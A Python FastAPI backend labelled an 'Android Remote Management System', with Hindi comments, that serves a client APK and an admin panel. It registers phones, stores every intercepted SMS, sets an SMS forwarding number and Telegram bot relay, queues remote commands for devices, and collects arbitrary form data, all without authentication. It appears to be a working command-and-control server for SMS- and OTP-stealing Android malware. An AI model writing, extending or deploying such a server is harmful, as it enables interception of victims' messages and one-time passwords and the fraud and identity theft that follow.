import uvicorn
from fastapi import FastAPI, HTTPException, Depends
from pydantic import BaseModel, Field
from typing import List, Optional, Dict, Any
from datetime import datetime, timedelta, timezone
import sqlite3
import json

# --- Configuration ---
DATABASE_URL = "rms.db"
ONLINE_THRESHOLD_SECONDS = 20

# --- Database Initialization ---
def get_db_connection():
    # Use check_same_thread=False for FastAPI/Gunicorn environment
    conn = sqlite3.connect(DATABASE_URL, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def now_utc():
    # Helper to get current time in the format used for DATETIME columns
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")

def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # 1. devices table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS devices (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT UNIQUE NOT NULL,
            device_name TEXT,
            os_version TEXT,
            phone_number TEXT,
            battery_level INTEGER,
            last_seen DATETIME NOT NULL,
            created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
        );
    """)

    # 2. commands table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            command_type TEXT NOT NULL,
            command_data TEXT NOT NULL,
            status TEXT NOT NULL DEFAULT 'pending',
            created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
        );
    """)

    # 3. sms_logs table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS sms_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            sender TEXT NOT NULL,
            message_body TEXT NOT NULL,
            received_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
        );
    """)

    # 4. form_submissions table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS form_submissions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            custom_data TEXT NOT NULL,
            submitted_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
        );
    """)

    # 5. global_settings table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS global_settings (
            setting_key TEXT PRIMARY KEY UNIQUE NOT NULL,
            setting_value TEXT
        );
    """)
    
    # --- Demo Device Initialization (User Request) ---
    cursor.execute("SELECT COUNT(*) FROM devices")
    if cursor.fetchone()[0] == 0:
        demo_device_id = "demo-device-12345"
        current_time = now_utc()
        
        cursor.execute(
            """
            INSERT INTO devices 
            (device_id, device_name, os_version, phone_number, battery_level, last_seen, created_at) 
            VALUES (?, ?, ?, ?, ?, ?, ?)
            """,
            (
                demo_device_id, "Test Device (Demo)", "Android 14", 
                "+919999999999", 95, current_time, current_time
            )
        )
        print(f"Demo device '{demo_device_id}' added to the database.")
    
    conn.commit()
    conn.close()

# Initialize the database on startup
init_db()

# --- Pydantic Models for Request/Response ---

# Feature 1: Device Registration
class DeviceRegisterRequest(BaseModel):
    device_id: str
    device_name: Optional[str] = None
    os_version: Optional[str] = None
    phone_number: Optional[str] = None
    battery_level: Optional[int] = None

# Feature 2: Device List
class DeviceResponse(BaseModel):
    device_id: str
    device_name: Optional[str] = None
    os_version: Optional[str] = None
    phone_number: Optional[str] = None
    battery_level: Optional[int] = None
    is_online: bool
    created_at: str

# Feature 3: SMS Forwarding Config Update
class SmsForwardConfigRequest(BaseModel):
    forward_number: str

# Feature 5: Telegram Config Update
class TelegramConfigRequest(BaseModel):
    telegram_bot_token: str
    telegram_chat_id: str

# Feature 6: Send Command
class SendCommandRequest(BaseModel):
    device_id: str
    command_type: str
    command_data: Dict[str, Any]

# Feature 7: Form Submission
class FormSubmissionRequest(BaseModel):
    custom_data: str

# Feature 8: SMS Log
class SmsLogRequest(BaseModel):
    sender: str
    message_body: str

# --- FastAPI Application ---
app = FastAPI(
    title="Android RMS Backend",
    description="Render-ready FastAPI backend for Android Remote Management System.",
    version="1.0.0"
)

# --- API Endpoints ---

@app.get("/")
async def root():
    """Simple root endpoint to check if the server is running."""
    return {"status": "ok", "message": "RMS Backend is running."}

# Feature 1: Device Registration and Live Status
@app.post("/api/device/register")
async def register_device(data: DeviceRegisterRequest):
    conn = get_db_connection()
    cursor = conn.cursor()
    
    current_time = now_utc()
    
    # 1. device_id के आधार पर devices टेबल में खोजें।
    cursor.execute("SELECT device_id FROM devices WHERE device_id = ?", (data.device_id,))
    device = cursor.fetchone()
    
    if device:
        # 3. अगर डिवाइस मिलता है: मौजूदा पंक्ति को अपडेट करें और सिर्फ last_seen को वर्तमान समय पर अपडेट करें।
        cursor.execute(
            "UPDATE devices SET last_seen = ? WHERE device_id = ?",
            (current_time, data.device_id)
        )
    else:
        # 2. अगर डिवाइस नहीं मिलता है: एक नई पंक्ति बनाएं और सभी जानकारी डालें।
        cursor.execute(
            """
            INSERT INTO devices 
            (device_id, device_name, os_version, phone_number, battery_level, last_seen, created_at) 
            VALUES (?, ?, ?, ?, ?, ?, ?)
            """,
            (
                data.device_id, data.device_name, data.os_version, 
                data.phone_number, data.battery_level, current_time, current_time
            )
        )
        
    conn.commit()
    conn.close()
    
    return {"status": "success", "message": "Device data received."}

# Feature 2: Admin Panel पर डिवाइस लिस्ट दिखाना
@app.get("/api/devices", response_model=List[DeviceResponse])
async def get_devices():
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # 1. स्थिर क्रम (Stable Order): created_at ASC
    cursor.execute("SELECT * FROM devices ORDER BY created_at ASC")
    devices = cursor.fetchall()
    
    response_list = []
    
    # Use UTC time for comparison
    current_time = datetime.now(timezone.utc)
    
    for device in devices:
        # SQLite stores DATETIME as string, need to parse it
        try:
            # Assuming the stored time is in UTC
            last_seen_dt = datetime.strptime(device['last_seen'], "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc)
        except ValueError:
            # Handle case where last_seen might be a different format or None (though schema says NOT NULL)
            last_seen_dt = current_time - timedelta(seconds=ONLINE_THRESHOLD_SECONDS + 1) # Assume offline if parse fails
        
        # 2. लाइव स्टेटस (is_online): (currentTime - last_seen) < 20 सेकंड
        is_online = (current_time - last_seen_dt).total_seconds() < ONLINE_THRESHOLD_SECONDS
        
        response_list.append(DeviceResponse(
            device_id=device['device_id'],
            device_name=device['device_name'],
            os_version=device['os_version'],
            phone_number=device['phone_number'],
            battery_level=device['battery_level'],
            is_online=is_online,
            created_at=device['created_at']
        ))
        
    conn.close()
    return response_list

# Feature 3: SMS फॉरवर्डिंग नंबर को अपडेट करना (Panel)
@app.post("/api/config/sms_forward")
async def update_sms_forward_config(data: SmsForwardConfigRequest):
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Logic: global_settings टेबल में setting_key = 'sms_forward_number' वाली पंक्ति की setting_value को अपडेट या इन्सर्ट करे।
    cursor.execute(
        """
        INSERT INTO global_settings (setting_key, setting_value) 
        VALUES (?, ?) 
        ON CONFLICT(setting_key) DO UPDATE SET setting_value=excluded.setting_value
        """,
        ('sms_forward_number', data.forward_number)
    )
    
    conn.commit()
    conn.close()
    
    return {"status": "success", "message": "Forwarding number updated successfully."}

# Feature 4: SMS फॉरवर्डिंग (Client)
@app.get("/api/config/sms_forward")
async def get_sms_forward_config():
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Logic: global_settings टेबल से setting_key = 'sms_forward_number' की setting_value लौटाए।
    cursor.execute("SELECT setting_value FROM global_settings WHERE setting_key = ?", ('sms_forward_number',))
    result = cursor.fetchone()
    
    conn.close()
    
    if result:
        return {"forward_number": result['setting_value']}
    
    # Default response if not set
    return {"forward_number": ""}

# Feature 5: Telegram Forwarding Config (Panel/Client)
@app.post("/api/config/telegram")
async def update_telegram_config(data: TelegramConfigRequest):
    conn = get_db_connection()
    cursor = conn.cursor()
    
    settings = {
        'telegram_bot_token': data.telegram_bot_token,
        'telegram_chat_id': data.telegram_chat_id
    }
    
    for key, value in settings.items():
        cursor.execute(
            """
            INSERT INTO global_settings (setting_key, setting_value) 
            VALUES (?, ?) 
            ON CONFLICT(setting_key) DO UPDATE SET setting_value=excluded.setting_value
            """,
            (key, value)
        )
        
    conn.commit()
    conn.close()
    
    return {"status": "success", "message": "Telegram config updated successfully."}

@app.get("/api/config/telegram")
async def get_telegram_config():
    conn = get_db_connection()
    cursor = conn.cursor()
    
    keys = ['telegram_bot_token', 'telegram_chat_id']
    results = {}
    
    for key in keys:
        cursor.execute("SELECT setting_value FROM global_settings WHERE setting_key = ?", (key,))
        result = cursor.fetchone()
        results[key] = result['setting_value'] if result else ""
        
    conn.close()
    
    return results

# Feature 6: पैनल से कमांड भेजना
@app.post("/api/command/send")
async def send_command(data: SendCommandRequest):
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Logic: इस कमांड को commands टेबल में status='pending' के साथ सेव करे।
    cursor.execute(
        "INSERT INTO commands (device_id, command_type, command_data) VALUES (?, ?, ?)",
        (data.device_id, data.command_type, json.dumps(data.command_data))
    )
    
    conn.commit()
    conn.close()
    
    return {"status": "success", "message": "Command sent and pending."}

# Feature 7: फॉर्म सबमिशन
@app.post("/api/device/{device_id}/forms")
async def submit_form(device_id: str, data: FormSubmissionRequest):
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Logic: इस डेटा को form_submissions टेबल में सेव करे।
    cursor.execute(
        "INSERT INTO form_submissions (device_id, custom_data) VALUES (?, ?)",
        (device_id, data.custom_data,)
    )
    
    conn.commit()
    conn.close()
    
    return {"status": "success", "message": "Form data submitted."}

# Feature 8: SMS लॉग्स
@app.post("/api/device/{device_id}/sms")
async def log_sms(device_id: str, data: SmsLogRequest):
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Logic: इस डेटा को sms_logs टेबल में सेव करे।
    cursor.execute(
        "INSERT INTO sms_logs (device_id, sender, message_body) VALUES (?, ?, ?)",
        (device_id, data.sender, data.message_body)
    )
    
    conn.commit()
    conn.close()
    
    return {"status": "success", "message": "SMS logged successfully."}

# Feature 9: क्लाइंट द्वारा पेंडिंग कमांड प्राप्त करना (New Logic)
@app.get("/api/device/{device_id}/commands")
async def get_pending_commands(device_id: str):
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # 1. सिर्फ status='pending' वाले कमांड ही भेजने चाहिए।
    cursor.execute(
        "SELECT id, command_type, command_data FROM commands WHERE device_id = ? AND status = ?",
        (device_id, 'pending')
    )
    commands = cursor.fetchall()
    
    command_list = []
    command_ids = []
    for cmd in commands:
        command_list.append({
            "id": cmd['id'],
            "command_type": cmd['command_type'],
            "command_data": json.loads(cmd['command_data']) # command_data is stored as TEXT (JSON)
        })
        command_ids.append(str(cmd['id']))
        
    # 2. कमांड भेजने के तुरंत बाद, सर्वर को उन सभी कमांड का स्टेटस status='sent' में बदल देना चाहिए।
    if command_ids:
        placeholders = ','.join('?' * len(command_ids))
        cursor.execute(
            f"UPDATE commands SET status = 'sent' WHERE id IN ({placeholders})",
            command_ids
        )
        conn.commit()
        
    conn.close()
    
    return command_list

# Feature 10: क्लाइंट द्वारा कमांड एक्जीक्यूशन को पूरा मार्क करना (New Logic)
@app.post("/api/command/{command_id}/execute")
async def mark_command_executed(command_id: int):
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Logic: सर्वर को स्टेटस को status='executed' में बदलना चाहिए।
    cursor.execute(
        "UPDATE commands SET status = 'executed' WHERE id = ?",
        (command_id,)
    )
    conn.commit()
    conn.close()
    
    return {"status": "success", "message": f"Command {command_id} marked as executed."}

# Feature 11: डिवाइस और उससे जुड़े डेटा को डिलीट करना (New Feature)
@app.delete("/api/device/{device_id}")
async def delete_device(device_id: str):
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Check if device exists before deleting
    cursor.execute("SELECT COUNT(*) FROM devices WHERE device_id = ?", (device_id,))
    if cursor.fetchone()[0] == 0:
        raise HTTPException(status_code=404, detail=f"Device {device_id} not found.")

    # Logic: उस डिवाइस को डिलीट करें
    cursor.execute("DELETE FROM devices WHERE device_id = ?", (device_id,))
    
    # Logic: उस डिवाइस से जुड़े सभी SMS (sms_logs) को भी डिलीट कर दें।
    cursor.execute("DELETE FROM sms_logs WHERE device_id = ?", (device_id,))
    
    # Logic: उस डिवाइस से जुड़े सभी फॉर्म सबमिशन (form_submissions) को भी डिलीट कर दें।
    cursor.execute("DELETE FROM form_submissions WHERE device_id = ?", (device_id,))
    
    # Optionally delete commands associated with the device
    cursor.execute("DELETE FROM commands WHERE device_id = ?", (device_id,))
    
    conn.commit()
    conn.close()
    
    return {"status": "success", "message": f"Device {device_id} and all associated data deleted."}

# Feature 12: SMS लॉग को डिलीट करना (New Feature)
@app.delete("/api/sms/{sms_id}")
async def delete_sms_log(sms_id: int):
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Logic: sms_logs टेबल से उस SMS को डिलीट करें जिसकी id URL में दी गई आईडी से मैच करती है।
    cursor.execute("DELETE FROM sms_logs WHERE id = ?", (sms_id,))
    
    if cursor.rowcount == 0:
        raise HTTPException(status_code=404, detail=f"SMS log {sms_id} not found.")

    conn.commit()
    conn.close()
    
    return {"status": "success", "message": f"SMS log {sms_id} deleted."}

# Feature 13: पैनल के लिए फॉर्म सबमिशन डेटा प्राप्त करना (New Feature - समस्या 1 का समाधान)
@app.get("/api/device/{device_id}/forms")
async def get_form_submissions(device_id: str):
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Logic: form_submissions टेबल से उस डिवाइस के सभी फॉर्म सबमिशन लौटाए
    cursor.execute(
        "SELECT id, custom_data, submitted_at FROM form_submissions WHERE device_id = ? ORDER BY submitted_at DESC",
        (device_id,)
    )
    forms = cursor.fetchall()
    
    form_list = []
    for form in forms:
        form_list.append({
            "id": form['id'],
            "custom_data": form['custom_data'],
            "submitted_at": form['submitted_at']
        })
        
    conn.close()
    return form_list

# Feature 14: पैनल के लिए SMS लॉग्स प्राप्त करना (New Feature - समस्या 2 का समाधान)
@app.get("/api/device/{device_id}/sms")
async def get_sms_logs(device_id: str):
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Logic: sms_logs टेबल से उस डिवाइस के सभी SMS लॉग्स लौटाए
    cursor.execute(
        "SELECT id, sender, message_body, received_at FROM sms_logs WHERE device_id = ? ORDER BY received_at DESC",
        (device_id,)
    )
    sms_logs = cursor.fetchall()
    
    sms_list = []
    for sms in sms_logs:
        sms_list.append({
            "id": sms['id'],
            "sender": sms['sender'],
            "message_body": sms['message_body'],
            "received_at": sms['received_at']
        })
        
    conn.close()
    return sms_list

# Feature 15: सभी डिवाइस के SMS लॉग्स प्राप्त करना (New Feature - वैकल्पिक)
@app.get("/api/sms_logs")
async def get_all_sms_logs():
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute(
        "SELECT id, device_id, sender, message_body, received_at FROM sms_logs ORDER BY received_at DESC"
    )
    sms_logs = cursor.fetchall()
    
    sms_list = []
    for sms in sms_logs:
        sms_list.append({
            "id": sms['id'],
            "device_id": sms['device_id'],
            "sender": sms['sender'],
            "message_body": sms['message_body'],
            "received_at": sms['received_at']
        })
        
    conn.close()
    return sms_list

# Feature 16: सभी डिवाइस के फॉर्म सबमिशन प्राप्त करना (New Feature - वैकल्पिक)
@app.get("/api/form_submissions")
async def get_all_form_submissions():
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute(
        "SELECT id, device_id, custom_data, submitted_at FROM form_submissions ORDER BY submitted_at DESC"
    )
    forms = cursor.fetchall()
    
    form_list = []
    for form in forms:
        form_list.append({
            "id": form['id'],
            "device_id": form['device_id'],
            "custom_data": form['custom_data'],
            "submitted_at": form['submitted_at']
        })
        
    conn.close()
    return form_list

# --- Simple Frontend for Status Check ---
from fastapi.responses import HTMLResponse

@app.get("/status", response_class=HTMLResponse)
async def status_check():
    html_content = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>RMS Backend Status</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body { font-family: Arial, sans-serif; text-align: center; padding-top: 50px; background-color: #f4f4f9; }
            .container { background-color: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); display: inline-block; }
            h1 { color: #28a745; }
            p { color: #333; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>✅ RMS Backend Running Successfully</h1>
            <p>यह सर्वर Render पर डिप्लॉय हो चुका है और काम कर रहा है।</p>
            <p>API Documentation के लिए <a href="/docs">/docs</a> पर जाएँ।</p>
            <p>यह केवल स्टेटस चेक के लिए एक साधारण पेज है। सभी API एंडपॉइंट्स अब क्लाइंट APK और पैनल के लिए उपलब्ध हैं।</p>
        </div>
    </body>
    </html>
    """
    return html_content

# if __name__ == "__main__":
#     # This block is for local testing only, Render uses the 'gunicorn' command.
#     uvicorn.run(app, host="0.0.0.0", port=8000)
